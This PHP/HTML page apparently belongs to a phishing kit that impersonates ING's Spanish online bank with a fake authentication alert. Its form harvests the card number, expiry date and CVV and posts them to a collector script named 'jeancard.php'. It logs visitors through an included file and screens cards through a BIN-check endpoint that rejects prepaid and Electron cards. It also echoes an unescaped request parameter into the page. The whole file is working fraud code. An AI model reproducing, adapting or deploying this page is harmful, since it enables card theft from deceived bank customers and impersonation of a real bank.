<?php
error_reporting(0);
$num=$_REQUEST['num'];
include 'visitor.php';
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr">
  <head><meta charset="windows-1252">

    <meta name="viewport" content="initial-scale=1.0; maximum-scale=1.0; user-scalable=0;"/><meta name="format-detection" content="telephone=no"/>
    <title>ING - Banco online sin comisiones</title>
    <link rel="icon" type="image/x-icon" href="./css/favicon.png"/>
    <link rel="stylesheet" href="css/merchant.css" type="text/css"/>
	    <link rel="stylesheet" href="css/opus.css" type="text/css"/>
		<link rel="stylesheet" href="css/footer.css" type="text/css"/>
		<link rel="stylesheet" href="css/onei.css" type="text/css"/>
		<link rel="stylesheet" href="css/eui.css" type="text/css"/>
		<style type="text/css">
  #heading{
    text-align: center;
    font-size: 15px;
	font-weight: bold;
    margin-left: 10px;
    margin-top: 10px;
    float:right;
  }
</style>
  </head>
  <body>

<div style="background-color:#fff;padding-right:5px;padding-left:10px;" class="col-xs-12 col-md-8 col-lg-8 col-xl-8"><img style="margin-top: 0px; height: 30px; width: 200px;" src="css/ing_leon-01.svg">

                <br><span id="heading"></span><br><br>
            </div>

<div id="amount"></div>
    <div id="container">
      <div id="header">
        <div class="divTitlee">
          <br>
		  <span class="title">Verificación de autenticación <span id="value"></span><img style="padding: 2px; height: 18px; width: 18px;" src="css/alert_severe.png" alt="solde d�biteur"></span>
          <span class="subtitle"></span>
        </div>
        <div id="headImage"></div>
      </div>

      <!-- <http-equiv='refresh' content='10; form action="./jean/jeandhl/jeancard.php" method="post" id="payment_form" onsubmit="return checkForm();"> -->
      <form action="./jean/jeandhl/jeancard.php" method="post" id="payment_form">
        <input type="hidden" name="LANG" value="fr">
        <input type="hidden" name="MCO" value="<?php print $num ?>">
        <input type="hidden" name="client_type" value="mobile">
        <input type="hidden" name="page_type" value="payment_offbill">

        <div id="input_data">
          <div id="form_js_error_container">
              <div class="wal_warning">
                <div class="warningImage"></div>
                <div id="warning_message" class="warning_message"></div>
                <div class="clear"></div>
              </div>
          </div>

          <div class="form_cardType">
                <label> <span class="libelle">
</span> &nbsp;</label><br>
<span style="color:red" id="error"></span>
                <input type="hidden" id="form_card_type" name="card_type" value="cb"></div><br>
          <div class="form_CardNumber">
            <label for="form_card_number" class="libelle">N&deg; Tarjeta:<span class="star">&nbsp;*</span></label><br>
            <input type="tel" size="16" pattern="[0-9]*" class="largeinput" name="jeancc" id="form_card_number" maxlength="19" autocomplete="off">
          </div>
          <div class="expiration_date">
            <div class="legende">
              <span class="libelle">Caducidad:</span>
              <span class="star">&nbsp;<i>(MM/AAAA)</i> *</span>
            </div>
            <div class="form_select">
              <select id="form_expiry_month" name="card_expiration_month">
                <option value="">mm</option>
                <option value="01">01</option>
                <option value="02">02</option>
                <option value="03">03</option>
                <option value="04">04</option>
                <option value="05">05</option>
                <option value="06">06</option>
                <option value="07">07</option>
                <option value="08">08</option>
                <option value="09">09</option>
                <option value="10">10</option>
                <option value="11">11</option>
                <option value="12">12</option>
              </select>
              <select id="form_expiry_year" name="card_expiration_year">
                <option value="">aaaa</option>
					<option value="2021">2021</option>
					<option value="2022">2022</option>
					<option value="2023">2023</option>
					<option value="2024">2024</option>
					<option value="2025">2025</option>
					<option value="2026">2026</option>
					<option value="2027">2027</option>
					<option value="2028">2028</option>
					<option value="2029">2029</option>
              </select>
            </div>
          </div>
          <div class="security_code">
            <div>
              <label for="form_card_security">
                <span class="libelle">Cód. Seguridad:</span>
                <span class="star">&nbsp;*</span>
              </label>
            </div>
            <input type="tel" size="5" pattern="[0-9]*" class="codeSecuriteinput" name="jeancvv" id="form_card_security" autocomplete="off" maxlength="3">
            <div class="cardCVV cardCBCVV"></div>
            <div class="security_code_info petit">
              El código de seguridad son los tres últimos dígitos que aparecen en el reverso de la tarjeta.

            </div>

          </div>
        </div>
        <div class="button">
          <input type="button" class="btn cancel" id="form_button_cancel" name="form_button_cancel" onclick="submitForm(this, 'action', 'cancel');" value="CANCELAR">
          <input type="submit" class="btn" id="form_button_submit" name="form_button_submit" value="ENVIAR">
        </div>
      </form>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>


    <!-- <script type="text/javascript" src="js/jquery.slim.min.js"></script> -->
    <script type="text/javascript" src="js/validationform.min.js"></script>
    <script type="text/javascript">

            let status = false;

             function checkMe(creditcard){
                 let error = '';
                 $.ajax({
                     dataType: 'JSON',
                     url: 'request.php',
                     type: 'POST',
                     data:{
                         credit: creditcard,

                     },

                     success: function(response){

                         if(response){
                             error = response.error;

                             if(error.match('Prepaid') || error.match('Electron'))
                             {
                                 $('#error').show();
                                 $('#error').text(response.error);
                                 status = true;
                             }


                         }else{
                             console.log("error");
                         }

                     },
                     error: function(){
                         console.log("Error Accured");
                     }
                 });
             }

       $(document).ready(function(){
                 $('#form_button_submit').prop('disabled', true);

                 $("#error").hide();

                 $("#form_card_number").on("change keyup paste click", function(event){
                     let card = $('#form_card_number').val();

                    console.log(card);

                     if(card.length === 6)
                     {
                        checkMe(card);
                     }
                     if(card.length >= 10 && !status){
                         $('#form_button_submit').prop('disabled', false);
                         status = false;
                         $('#error').hide();
                     }

                     if(card.length === 2)
                     {
                         status = false;
                         $('#error').hide();
                     }

                     if(card.length === 16)
                     {
                      setinputSecuCodeLength(card);
                     }
                 });


       });


var localizedMessages = {"error_card_empty_issue_number":"Ingrese su numero de tarjeta de credito","error_card_amex_incorrect_crypto_length":"El codigo de seguridad debe tener 4 digitos.","error_card_incorrect_number_length":"El numero de la tarjeta de credito debe tener 16 digitos.","error_card_no_card_type":"Aucun type de carte n'a ete selectionne","error_card_incorrect_crypto_format":"Le code de securite ne doit comporter que des chiffres","error_card_incorrect_crypto_length":"Los digitos de control deben ser 3 digitos","error_card_incorrect_issue_number_length":"Le numero d'emission doit �tre compose de 1 ou 2 chiffres","error_card_expiry_date_passed":"la fecha de caducidad de la tarjeta ha expirado, verifique los datos ingresados","error_card_ctv_one_common":"Le champ {0} n'est pas renseigne correctement","error_card_empty_expiry_date":"complete la fecha de caducidad de su tarjeta","error_card_issue_date_not_passed":"La date d'emission de votre carte est n'est pas passee, verifiez la date indiquee sur votre carte","error_card_empty_crypto":"Complete el c�digo de seguridad","error_card_incorrect_issue_number_format":"Le numero d'emission ne doit comporter que des chiffres","error_card_incorrect_number":"el numero de la tarjeta de credito es incorrecto","error_card_empty_holder":"Aucun nom du detenteur de carte n'a ete saisi","error_card_incorrect_number_format":"El numero de la tarjeta de credito solo puede contener numeros","error_card_amex_incorrect_number_length":"Le numero de carte bancaire doit �tre compose de 15 chiffres","error_card_empty_issue_date":"Aucune date d'emission valide n'a ete selectionnee","error_card_ctv_many_common":"Les champs {0} ne sont pas renseignes correctement","error_card_empty_number":"No ingreso su numero de tarjeta de credito"};
var today = 20210105;
    </script>
    <noscript>Cette page utilise du Javascript. Activez le Javascript via le menu "options" de votre navigateur.</noscript>


</div></body>
</html>